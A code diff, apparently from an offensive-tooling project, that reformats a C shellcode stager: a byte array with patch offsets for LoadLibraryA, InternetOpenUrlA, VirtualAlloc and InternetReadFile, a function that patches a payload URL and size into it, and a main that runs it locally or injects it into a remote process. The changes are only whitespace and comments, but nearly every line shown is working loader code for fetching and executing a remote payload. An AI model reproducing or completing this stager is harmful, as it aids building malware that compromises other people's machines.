@@ -21,7 +21,7 @@ unsigned char Shellcode[256] = {
 	0x48, 0x8B, 0xCC,												
 
 	0x48, 0x83, 0xEC, 0x20,												
-	0x48, 0xB8,															// * LoadLibraryA (29)
+	0x48, 0xB8,										// * LoadLibraryA (29)
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						
 	0xFF, 0xD0,															
 	0x48, 0x83, 0xC4, 0x30,												
@@ -70,7 +70,7 @@ unsigned char Shellcode[256] = {
 	0x41, 0xB9, 0x40, 0x00, 0x00, 0x00,
 	0x41, 0xB8, 0x00, 0x30, 0x00, 0x00,
 	0xBA,														
-	0x00, 0x00, 0x00, 0x00,												// * PAYLOAD_SIZE (156)
+	0x00, 0x00, 0x00, 0x00,									// * PAYLOAD_SIZE (156)
 	0x33, 0xC9,
 	0x48, 0xB8,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * VirtualAlloc (164)
@@ -80,7 +80,7 @@ unsigned char Shellcode[256] = {
 
 	0x4C, 0x8B, 0xCC,											
 	0x41, 0xB8,													
-	0x00, 0x00, 0x00, 0x00,												// * PAYLOAD_SIZE (184)
+	0x00, 0x00, 0x00, 0x00,									// * PAYLOAD_SIZE (184)
 	0x48, 0x8B, 0x54, 0x24, 0x20,
 	0x48, 0x8B, 0x4C, 0x24, 0x28,
 	0x48, 0xB8,
@@ -109,17 +109,17 @@ unsigned char Shellcode[256] = {
 
 
 BOOL PatchShellcode(PBYTE pUrl, SIZE_T PayloadSize) {
-	
-	const int pLoadLibraryA_offset			= 29;
-	const int pInternetOpenA_offset			= 72;
-	const int pUrl_offset					= 113;
-	const int pInternetOpenUrlA_offset		= 128;
+	// offsets of addresses in the shellcode to patch
+	const int pLoadLibraryA_offset		= 29;
+	const int pInternetOpenA_offset		= 72;
+	const int pUrl_offset			= 113;
+	const int pInternetOpenUrlA_offset	= 128;
 
-	const int pSize_offset1					= 156;
-	const int pVirtualAlloc_offset			= 164;
+	const int pSize_offset1			= 156;
+	const int pVirtualAlloc_offset		= 164;
 
-	const int pSize_offset2					= 184;
-	const int pInternetReadFile_offset		= 200;
+	const int pSize_offset2			= 184;
+	const int pInternetReadFile_offset	= 200;
 
 	const int pInternetCloseHandle_offset1	= 217;
 	const int pInternetCloseHandle_offset2	= 234;
@@ -250,7 +250,7 @@ int main(int argc, char* argv[]) {
 
 	printf("[+] %s : 0x%p \n", "Shellcode", (PVOID)Shellcode);
 
-	
+	// if local injection we patch here :
 	if (!Remotely) {
 		printf("[i] Pathcing The Shellcode ... ");
 		if (!PatchShellcode(&PAYLOAD_LINK, PAYLOAD_SIZE)) {
@@ -260,7 +260,7 @@ int main(int argc, char* argv[]) {
 		printf("[+] DONE \n");
 	}
 	
-	
+	// running :
 	if (Remotely) {
 		if (!Remote(hProcess)) {
 			return -1;
